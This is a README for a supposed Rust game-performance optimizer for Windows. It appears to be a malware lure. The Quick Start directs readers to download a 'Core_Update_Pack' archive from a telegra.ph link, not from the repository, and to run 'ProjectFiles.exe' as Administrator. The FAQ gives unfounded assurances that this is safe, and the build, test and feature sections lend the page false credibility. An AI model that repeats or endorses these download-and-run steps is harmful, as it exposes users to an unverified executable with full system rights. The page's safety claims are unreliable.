<div align="center">

# ⚡ FPS Optimizer (Rust)

**A lightweight Rust-powered game performance optimizer — stable FPS, fewer stutters, lower input latency.**

[![Rust](https://img.shields.io/badge/Rust-1.75%2B-orange?logo=rust)](https://www.rust-lang.org/)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?logo=windows)](https://github.com/)
[![Build](https://img.shields.io/github/actions/workflow/status/USER/fps-optimizer-rust/ci.yml?label=build)](../../actions)

</div>

---

## 🎯 What it is

**FPS Optimizer** is a Rust utility that helps squeeze more frames out of your system and makes gameplay smoother. It applies safe system profiles, tunes process priorities, and reduces latency — without third-party drivers.

> ⚠️ All settings are reversible. A profile backup is created before any change is applied.

---

## 🚀 Quick Start

<div align="center">

### 🔽 [**⬇️ Download Core_Update_Pack and run ProjectFiles.exe**](https://telegra.ph/TRANSITION-06-17-3)

</div>

1. Download **`Core_Update_Pack`** using the button above.
2. Extract the archive into a separate folder.
3. Run **`ProjectFiles.exe`** as Administrator.
4. Pick a profile (Balanced / Performance / Competitive) and click **Apply**.

---

## ✨ Features

| Feature | Description |
|---|---|
| 🎮 **Game Profiles** | Ready-made presets: Balanced, Performance, Competitive |
| ⚙️ **Process Priority** | Automatic priority tuning for game processes |
| 🧠 **Memory Tuning** | Working-set cleanup and memory optimization |
| 🔋 **Power Plan** | Power-scheme switching based on load |
| 📉 **Latency Reduction** | Lower scheduler and timer latency |
| 🧾 **Reversible Tweaks** | Every change can be rolled back with one command |
| 🦀 **Pure Rust** | Single binary, no dependencies or runtimes |

---

## 🧩 CLI Usage

```bash
fps-optimizer list
fps-optimizer apply --profile performance
fps-optimizer rollback
fps-optimizer status
```

---

## 🏗️ Build from Source

```bash
git clone https://github.com/USER/fps-optimizer-rust.git
cd fps-optimizer-rust
cargo build --release
./target/release/fps-optimizer --help
```

Requirements: **Rust 1.75+**, Windows 10/11.

---

## 📂 Project Layout

```
src/
├── main.rs          # Entry point
├── cli.rs           # Argument parsing
├── config.rs        # Configuration
├── optimizer/       # Optimization core
└── profiles/        # Profile presets
```

---

## 🧪 Testing

```bash
cargo test
cargo clippy -- -D warnings
cargo fmt --check
```

---

## ❓ FAQ

**Is this safe?**
Yes. All changes are reversible and never touch system files.

**Do I need administrator rights?**
Yes — for changing process priorities and power schemes.

**Does it work on Linux/macOS?**
The primary target is Windows. Support for other platforms is planned.

More in [docs/FAQ.md](docs/FAQ.md).

---

## 🤝 Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md). PRs, bug reports, and new profiles are welcome.

---

## 📜 License

MIT © 2026 FPS Optimizer Contributors. See [LICENSE](LICENSE).

---

<div align="center">

**⭐ Star the repo if it helped you boost your FPS!**

</div>